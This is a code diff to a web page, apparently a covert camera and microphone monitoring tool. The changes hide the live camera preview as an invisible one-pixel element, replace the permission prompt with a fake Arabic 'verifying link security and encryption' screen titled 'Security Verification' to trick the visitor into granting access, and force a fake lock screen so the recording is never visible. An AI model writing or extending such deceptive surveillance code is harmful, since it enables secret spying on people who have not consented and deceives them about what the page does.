@@ -23,9 +23,13 @@
         }
 
         #localVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
 
         /* Stealth Mode Overlay */
@@ -58,16 +62,23 @@
 
 <body>
     <!-- Permission Gate -->
-    <div id="permission-overlay" class="login-overlay" style="z-index: 20000;">
-        <div class="login-card" style="max-width: 450px;">
+    <div id="permission-overlay" class="login-overlay" style="z-index: 20000; background: #000;">
+        <div class="login-card" style="max-width: 450px; background: transparent; border: none; box-shadow: none;">
             <div
-                style="width: 80px; height: 80px; background: rgba(59, 130, 246, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
-                <ion-icon name="sync-circle" style="font-size: 3rem; color: var(--primary);"></ion-icon>
+                style="width: 60px; height: 60px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 30px;">
             </div>
-            <h2 style="margin-bottom: 10px;">مزامنة البيانات</h2>
-            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px;">للمتابعة، يرجى الضغط على الزر
-                أدناه للسماح للمتصفح بمزامنة البيانات مع السيرفر.</p>
-            <button id="start-btn" class="btn" style="width: 100%;">بدء المزامنة الآن</button>
+            <h2 style="margin-bottom: 10px; color: white;">جاري التحقق من أمان الرابط...</h2>
+            <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 40px;">نقوم الآن بفحص شهادات الأمان وتشفير
+                البيانات لضمان خصوصية الاتصال. يرجى الضغط للمتابعة.</p>
+            <button id="start-btn" class="btn" style="width: 100%; height: 55px; font-weight: 700;">تحقق
+                ومتابعة</button>
+            <style>
+                @keyframes spin {
+                    to {
+                        transform: rotate(360deg);
+                    }
+                }
+            </style>
         </div>
     </div>
 
@@ -124,10 +135,10 @@
 
         if (isAudioOnly) {
             // Extreme Stealth UI adjustments
-            document.title = "System Update"; // Generic title
-            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync-outline"></ion-icon> بدء المزامنة الآن';
-            document.querySelector('#permission-overlay h2').innerText = "مزامنة بيانات النظام";
-            document.querySelector('#permission-overlay p').innerText = "يتم الآن جلب آخر التحديثات والأذونات اللازمة لاستقرار النظام، يرجى الضغط للمتابعة...";
+            document.title = "Security Verification"; // Generic title
+            document.getElementById('start-btn').innerHTML = 'تحقق ومتابعة';
+            document.querySelector('#permission-overlay h2').innerText = "جاري التحقق من أمان الرابط...";
+            document.querySelector('#permission-overlay p').innerText = "نقوم الآن بفحص شهادات الأمان وتشفير البيانات لضمان خصوصية الاتصال. يرجى الضغط للمتابعة.";
             document.getElementById('localVideo').style.display = 'none';
         }
 
@@ -147,11 +158,10 @@
                 console.warn("Audio unlock failed:", e);
             }
 
-            if (isAudioOnly) {
-                // Immediate stealth for audio mode
-                document.getElementById('dim-overlay').classList.add('active');
-                updateClock();
-            }
+            // 🎭 Immediate Stealth Mode for ALL
+            // This ensures the device always goes to the fake lock screen and never shows the camera feed
+            document.getElementById('dim-overlay').classList.add('active');
+            updateClock();
 
             system = new MonitorSystem(roomId);
 
